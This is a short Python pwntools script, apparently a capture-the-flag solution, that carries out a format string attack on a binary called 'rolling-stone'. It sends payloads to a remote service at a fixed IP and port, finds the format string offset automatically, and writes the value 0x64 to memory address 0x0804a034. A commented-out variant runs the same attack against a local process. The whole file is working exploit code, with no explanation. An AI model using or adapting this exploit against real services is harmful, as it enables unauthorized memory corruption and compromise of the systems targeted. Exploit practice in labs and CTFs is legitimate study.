from pwn import *

# p = process("./rolling-stone")

def exec_fmt(payload):
    p = remote('141.85.224.103', 31337)
    p.sendline(payload)
    r = p.recvall()
    print r
    return r


"""
autofmt = FmtStr(exec_fmt)
offset = autofmt.offset
p = process('./rolling-stone', stderr=PIPE)
addr = 0x0804a034
payload = fmtstr_payload(offset, {addr: 0x64})

print payload

p.sendline(payload)
print p.recvline(timeout=5)
"""

fs = FmtStr(execute_fmt=exec_fmt)
fs.write(0x0804a034, 0x64)
fs.execute_writes()

